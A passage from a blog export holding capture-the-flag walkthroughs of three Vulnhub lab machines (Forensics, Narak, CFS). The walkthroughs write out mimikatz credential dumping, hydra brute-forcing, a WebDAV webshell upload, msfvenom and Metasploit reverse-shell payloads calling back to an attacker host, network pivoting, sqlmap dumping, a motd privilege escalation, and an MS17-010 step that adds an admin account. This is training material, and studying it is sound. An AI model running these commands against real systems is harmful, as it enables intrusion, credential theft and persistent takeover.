<p><img src="/2023/05/17/javasec/apache-log4j-jndi/apache-log4j-jndi/3.png" alt="3"></p>
<p><img src="/2023/05/17/javasec/apache-log4j-jndi/apache-log4j-jndi/4.png" alt="4"></p>
]]></content>
  </entry>
  <entry>
    <title>Vulnhub Forensics</title>
    <url>/2023/06/01/vulnhub/vulnhub-forensics/vulnhub-forensics/</url>
    <content><![CDATA[<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><pre><code>HA: Forensics is an intermediate level of the lab, which gives you a hand on real-life experience in Cyber Forensic Investigation. This lab is completely dedicated to methods and tools of Cyber Forensic Investigation and there is evidence that can be found with various techniques. As it is a Capture-the-Flag, it is very important to note that it is not a root challenge, and comes with a primary motive to find all the flags.

No. of Flags: 4

Objective: Find all 4 flags (Getting Root is NOT the objective)</code></pre>
<h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p><a href="http://192.168.8.128/images/">http://192.168.8.128/images/</a> 在fingerprint.jps中发现flag1</p>
<p><img src="/2023/06/01/vulnhub/vulnhub-forensics/vulnhub-forensics/image-20230601172753927.png" alt="image-20230601172753927"></p>
<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p><a href="http://192.168.246.142/igolder/">http://192.168.246.142/igolder/</a> 密码for007在pdf获取flag2</p>
<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>mimikatz获取到lsass.dmp中jasoos和raj的账号信息</p>
<pre><code>mimikatz # sekurlsa::minidump E:\Downloads\flag\lsass.dmp
Switch to MINIDUMP : 'E:\Downloads\flag\lsass.dmp'

mimikatz # sekurlsa::logonPasswords full
Opening : 'E:\Downloads\flag\lsass.dmp' file for minidump...</code></pre>
<p><img src="/2023/06/01/vulnhub/vulnhub-forensics/vulnhub-forensics/image-20230601203159246.png" alt="image-20230601203159246"></p>
<p><img src="/2023/06/01/vulnhub/vulnhub-forensics/vulnhub-forensics/image-20230601203134763.png"></p>
<p>NTLM解密得到密码jasoos:Password@1</p>
<p><img src="/2023/06/01/vulnhub/vulnhub-forensics/vulnhub-forensics/image-20230601172023469.png" alt="image-20230601172023469"></p>
<p>msf采用ssh模块</p>
<pre><code>use auxiliary/scanner/ssh/ssh_login
set rhosts 192.168.8.128
set username jasoos
set password Password@1
exploit</code></pre>
<p><img src="/2023/06/01/vulnhub/vulnhub-forensics/vulnhub-forensics/image-20230601203646418.png" alt="image-20230601203646418"></p>
<p>开启metetpreter会话</p>
<pre><code>sessions -l
sessions -u 1
sessions 2</code></pre>
<p><img src="/2023/06/01/vulnhub/vulnhub-forensics/vulnhub-forensics/image-20230601203847815.png" alt="image-20230601203847815"></p>
<p>查看到网卡存在第二个段</p>
<pre><code>python -c 'import pty;pty.spawn("/bin/bash")'
ifconfig</code></pre>
<p><img src="/2023/06/01/vulnhub/vulnhub-forensics/vulnhub-forensics/image-20230601204123266.png" alt="image-20230601204123266"></p>
<p>添加路由进入172.17.0.0/24网段</p>
<pre><code>use post/multi/gather/ping_sweep
set session 3 
set rhosts 172.17.0.0/24
exploit</code></pre>
<p><img src="/2023/06/01/vulnhub/vulnhub-forensics/vulnhub-forensics/image-20230601205705829.png" alt="image-20230601205705829"></p>
<pre><code>use auxiliary/scanner/portscan/tcp
set rhosts 172.17.0.2
set ports 1-2000
exploit</code></pre>
<p>匿名访问22端口并开启http服务带出saboot.001</p>
<p><img src="/2023/06/01/vulnhub/vulnhub-forensics/vulnhub-forensics/image-20230601210121254.png" alt="image-20230601210121254"></p>
<p><img src="/2023/06/01/vulnhub/vulnhub-forensics/vulnhub-forensics/image-20230601172104323.png" alt="image-20230601172104323"></p>
<p>采用kali自带数据取证中的autopsy进行分析</p>
<p><img src="/2023/06/01/vulnhub/vulnhub-forensics/vulnhub-forensics/image-20230601210233181.png" alt="image-20230601210233181"></p>
<p>得到flag3和一串base64</p>
<p><img src="/2023/06/01/vulnhub/vulnhub-forensics/vulnhub-forensics/image-20230601172138352.png" alt="image-20230601172138352"></p>
<p><img src="/2023/06/01/vulnhub/vulnhub-forensics/vulnhub-forensics/image-20230601172034547.png" alt="image-20230601172034547"></p>
<h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>登陆forensics可以直接提权到root</p>
<p><img src="/2023/06/01/vulnhub/vulnhub-forensics/vulnhub-forensics/image-20230601210457792.png" alt="image-20230601210457792"></p>
<pre><code>Flag:1 {bc02d4ffbeeab9f57c5e03de1098ff31}
Flag:2 {4a3232c59ecda21ac71bebe3b329bf36}
Flag:3 {8442460f48338fe60a9497b8e0e9022f}
Root Flag: {9440aee508b6215995219c58c8ba4b45}</code></pre>
]]></content>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub Narak(cadaver/motd/linpeas)</title>
    <url>/2023/05/29/vulnhub/vulnhub-narak/vulnhub-narak/</url>
    <content><![CDATA[<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>192.168.9.181/webdav</p>
<pre><code>cewl http://192.168.9.181 -w wordlist.txt

hydra -L wordlist.txt -P wordlist.txt -f -V 192.168.246.140 http-get /webdav</code></pre>
<p>cewl生成字典用hydra爆破，得到用户密码yamdoot:Swarg</p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>webdav存在不安全的put方法</p>
<ol>
<li><h4 id="采用cadaver上传webshell"><a href="#采用cadaver上传webshell" class="headerlink" title="采用cadaver上传webshell"></a>采用cadaver上传webshell</h4><p><img src="/2023/05/29/vulnhub/vulnhub-narak/vulnhub-narak/image-20230530155610987.png" alt="image-20230530155610987"></p>
</li>
<li><h4 id="msf中的webdav模块"><a href="#msf中的webdav模块" class="headerlink" title="msf中的webdav模块"></a>msf中的webdav模块</h4><pre><code>use exploit/windows/http/xampp_webdav_upload_php
set payload php/meterpreter/reverse_tcp
set RHOST 192.168.9.181
set USERNAME yamdoot
set PASSWORD Swarg
set LHOST 192.168.9.128</code></pre>
<p>运行php成功反弹</p>
<p><img src="/2023/05/29/vulnhub/vulnhub-narak/vulnhub-narak/image-20230530160532846.png" alt="image-20230530160532846"></p>
</li>
</ol>
<p>发现/home下的三个用户</p>
<pre><code>inferno narak yamdoot</code></pre>
<p>对brainfuck解密得到inferno的密码chitragupt，ssh成功登录</p>
<p><img src="/2023/05/29/vulnhub/vulnhub-narak/vulnhub-narak/image-20230530160807309.png" alt="image-20230530160807309"></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="1-使用motd提权"><a href="#1-使用motd提权" class="headerlink" title="1.使用motd提权"></a>1.使用motd提权</h4><p>（用户登录系统时弹出的欢迎信息，默认是放在/etc/update-motd.d/的shell脚本。这些脚本文件就是当用户登录时就能以root用户身份执行一段代码。故尝试修改其中某个脚本，当每次登录系统就把root用户密码修改为一个已知的密码）</p>
<pre><code>find / -type f -user root -perm -ug=x,o=w -exec ls -l '{}' \; 2&gt;/dev/null</code></pre>
<p><img src="/2023/05/29/vulnhub/vulnhub-narak/vulnhub-narak/image-20230530161102504.png" alt="image-20230530161102504"></p>
<p>或者采用辅助脚本<a href="https://github.com/carlospolop/PEASS-ng/tree/master">linpeas.sh</a></p>
<p><img src="/2023/05/29/vulnhub/vulnhub-narak/vulnhub-narak/image-20230530161843985.png" alt="image-20230530161843985"></p>
<p><img src="/2023/05/29/vulnhub/vulnhub-narak/vulnhub-narak/image-20230530161805010.png" alt="image-20230530161805010"></p>
<pre><code>echo "echo 'root:root'| chpasswd"&gt;&gt;00-header</code></pre>
<p>重新登陆并提权获取flag</p>
<p><img src="/2023/05/29/vulnhub/vulnhub-narak/vulnhub-narak/image-20230530161408727.png" alt="image-20230530161408727"></p>
<h4 id="2-CVE-2021-3493"><a href="#2-CVE-2021-3493" class="headerlink" title="2.CVE-2021-3493"></a>2.CVE-2021-3493</h4><p>不赘述</p>
]]></content>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub CFS</title>
    <url>/2023/09/19/vulnhub/vulnhub-cfs/vulnhub-cfs/</url>
    <content><![CDATA[<h2 id="CFS"><a href="#CFS" class="headerlink" title="CFS"></a>CFS</h2><p>IP拓扑</p>
<table>
<thead>
<tr>
<th>kali</th>
<th>centos</th>
<th>ubuntu</th>
<th>win7</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.11.128</td>
<td>192.168.11.129</td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td>192.168.22.128</td>
<td>192.168.22.129</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>192.168.33.128</td>
<td>192.168.33.129</td>
</tr>
</tbody></table>
<h3 id="centos"><a href="#centos" class="headerlink" title="centos"></a>centos</h3><pre><code>root teamssix.com
宝塔后台 http://192.168.11.129:8888/a768f109/ eaj3yhsl 41bb8fee</code></pre>
<p>脚本直接获取www</p>
<p><img src="/2023/09/19/vulnhub/vulnhub-cfs/vulnhub-cfs/image-20230918135359380.png" alt="image-20230918135359380"></p>
<pre><code>flag{e2D3aFdasde}</code></pre>
<p>补充第一台靶机根目录的flag</p>
<p><img src="/2023/09/19/vulnhub/vulnhub-cfs/vulnhub-cfs/image-20230918222029524.png" alt="image-20230918222029524"></p>
<pre><code>flag{qEa12Nasd1a}</code></pre>
<p>写马上线哥斯拉</p>
<p><img src="/2023/09/19/vulnhub/vulnhub-cfs/vulnhub-cfs/image-20230918140014503.png" alt="image-20230918140014503"></p>
<p>看网卡,发现存在22网段</p>
<p><img src="/2023/09/19/vulnhub/vulnhub-cfs/vulnhub-cfs/image-20230918222000618.png" alt="image-20230918222000618"></p>
<pre><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.11.128 lport=6666 R&gt;h3ppo.php
use multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 192.168.11.128
set lport 6666</code></pre>
<p><img src="/2023/09/19/vulnhub/vulnhub-cfs/vulnhub-cfs/image-20230918221813592.png" alt="image-20230918221813592"></p>
<p>弹到msf上</p>
<p><img src="/2023/09/19/vulnhub/vulnhub-cfs/vulnhub-cfs/image-20230918221859806.png" alt="image-20230918221859806"></p>
<p>添加路由进入22网段</p>
<pre><code>run autoroute -s 192.168.22.0/24</code></pre>
<p><img src="/2023/09/19/vulnhub/vulnhub-cfs/vulnhub-cfs/image-20230918142609652.png" alt="image-20230918142609652"></p>
<p>添加socks5到proxychains4（有服务器用suo5也行）</p>
<p><img src="/2023/09/19/vulnhub/vulnhub-cfs/vulnhub-cfs/image-20230918143249654.png" alt="image-20230918143249654"></p>
<h3 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h3><pre><code>root teamssix.com
宝塔后台 http://192.168.22.129:8888/2cc52ec0/ xdynr37d 123qwe..
cms后台 admin 123qwe</code></pre>
<pre><code>python3 sqlmap.py -u "http://192.168.22.129/index.php?r=vul&amp;keyword=1" -D begacms -T bage_admin -C username,password --dump</code></pre>
<p><img src="/2023/09/19/vulnhub/vulnhub-cfs/vulnhub-cfs/image-20230918153229759.png" alt="image-20230918153229759"></p>
<pre><code> flag{eS3sd1IKarw}</code></pre>
<p>直接写马</p>
<p><img src="/2023/09/19/vulnhub/vulnhub-cfs/vulnhub-cfs/image-20230918153357783.png" alt="image-20230918153357783"></p>
<p><img src="/2023/09/19/vulnhub/vulnhub-cfs/vulnhub-cfs/image-20230918154017655.png" alt="image-20230918154017655"></p>
<p>有个33的网卡</p>
<h3 id="win7"><a href="#win7" class="headerlink" title="win7"></a>win7</h3><p><img src="/2023/09/19/vulnhub/vulnhub-cfs/vulnhub-cfs/image-20230918154443678.png" alt="image-20230918154443678"></p>
<p>msf管道梭了(提前写对命令别把管道用完了)</p>
<p><img src="/2023/09/19/vulnhub/vulnhub-cfs/vulnhub-cfs/image-20230918154640690.png" alt="image-20230918154640690"></p>
<pre><code>use auxiliary/admin/smb/ms17_010_command
set rhosts 192.168.33.129</code></pre>
<p><img src="/2023/09/19/vulnhub/vulnhub-cfs/vulnhub-cfs/image-20230918155447339.png" alt="image-20230918155447339"></p>
<p>添加用户直接3389登陆接管 win7 渗透结束</p>
<pre><code>net user creampie 12345678=love /add
net localgroup Administrators creampie /add</code></pre>
<p><img src="/2023/09/19/vulnhub/vulnhub-cfs/vulnhub-cfs/image-20230918223022054.png" alt="image-20230918223022054"></p>
]]></content>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
</search>
